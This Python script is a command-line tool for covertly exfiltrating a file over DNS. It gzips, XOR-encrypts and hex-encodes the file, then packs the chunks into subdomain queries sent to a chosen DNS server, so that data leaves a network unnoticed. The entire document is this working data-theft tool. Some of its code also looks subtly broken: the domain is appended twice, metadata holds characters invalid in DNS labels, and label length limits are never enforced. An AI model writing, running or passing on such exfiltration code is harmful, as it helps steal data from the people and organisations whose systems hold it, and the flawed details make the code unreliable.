import argparse
import base64
import gzip
import os
import socket
import sys
import time
from datetime import datetime

import dns.resolver
import dns.query
import dns.message

# XOR encryption function
def xor_encrypt(data, password):
    pwd_len = len(password)
    encrypted = bytearray(data)
    for i in range(len(data)):
        encrypted[i] ^= password[i % pwd_len]
    return encrypted

# Data chunking function
def chunk_data(data, chunk_size):
    for i in range(0, len(data), chunk_size):
        yield data[i:i + chunk_size]

# Function to send DNS query with retries
def send_dns_query(subdomain, dns_server_ip, use_tcp):
    max_retries = 5
    retry_count = 0
    timeout = 3  # seconds
    while retry_count < max_retries:
        try:
            domain = subdomain + ".example.com"
            query = dns.message.make_query(domain, dns.rdatatype.A)
            if use_tcp:
                response = dns.query.tcp(query, dns_server_ip, timeout=timeout)
            else:
                response = dns.query.udp(query, dns_server_ip, timeout=timeout)
            return response
        except (dns.exception.Timeout, socket.timeout) as e:
            retry_count += 1
            print(f"[*] Timeout occurred, retrying {retry_count}/{max_retries}...")
            time.sleep(timeout)
    print("[!] Failed to send DNS query after multiple retries.")
    return None

def main():
    parser = argparse.ArgumentParser(description="Exfiltrates a file over DNS by sending XOR-encrypted, base64 encoded chunks as DNS queries.")
    parser.add_argument('-f', '--file', required=True, help='Path to the file you want to exfiltrate.')
    parser.add_argument('-p', '--password', required=True, help='Password to be used in XOR encryption.')
    parser.add_argument('-d', '--domain', default='example.com', help='Domain to use in DNS queries.')
    parser.add_argument('-s', '--dns-server', default='8.8.8.8', help='IP address of the DNS server.')
    parser.add_argument('-t', '--tcp', action='store_true', help='Use TCP instead of UDP.')
    args = parser.parse_args()

    if not os.path.isfile(args.file):
        print("[!] Error: File not found.")
        sys.exit(1)

    file_path = args.file
    password = args.password.encode()
    domain = args.domain
    dns_server_ip = args.dns_server
    use_tcp = args.tcp

    # Get filename from file_path
    filename = os.path.basename(file_path)

    # Generate timestamp in format yyyyMMddHHmmss
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')

    print("[*] Encrypting file, please wait...")
    with open(file_path, 'rb') as f:
        file_data = f.read()

    compressed_data = gzip.compress(file_data)
    encrypted_data = xor_encrypt(compressed_data, password)
    encrypted_hex_data = encrypted_data.hex()

    # Maximum DNS query size constraints
    label_max_size = 63
    request_max_size = 235

    # Calculate space required for domain name and metadata
    domain_name_length = len(domain) + 3
    metadata_length = (len(filename) + len(timestamp)) * 2

    # Calculate maximum bytes available for data in each DNS query
    bytes_left = request_max_size - metadata_length - domain_name_length

    # Calculate number of chunks
    nb_chunks = (len(encrypted_hex_data) + bytes_left - 1) // bytes_left

    print(f"[+] Maximum data exfiltrated per DNS request (chunk max size): [{bytes_left}] bytes")
    print(f"[+] Number of chunks: [{nb_chunks}]")

    chunk_id = 0

    print("[*] Sending file, please wait...")

    for chunk_id, chunk in enumerate(chunk_data(encrypted_hex_data, bytes_left)):
        # Split chunk into 4 equal chunks
        chunk_length = (len(chunk) + 3) // 4
        chunks = [chunk[i * chunk_length:(i + 1) * chunk_length] for i in range(4)]

        # Construct DNS query
        encrypted_filename = xor_encrypt(filename.encode(), password).hex()
        metadata = f"{encrypted_filename}|{timestamp}|{nb_chunks}"
        subdomain = f"{chunk_id}.{chunks[0]}.{chunks[1]}.{chunks[2]}.{chunks[3]}.{metadata}.{domain}"

        # Send DNS query using dnspython with retry logic
        send_dns_query(subdomain, dns_server_ip, use_tcp)

        print(f"{(100 * (chunk_id + 1) / nb_chunks):.2f}% complete", end='\r')

    print("[+] Transfer complete!")

if __name__ == '__main__':
    main()
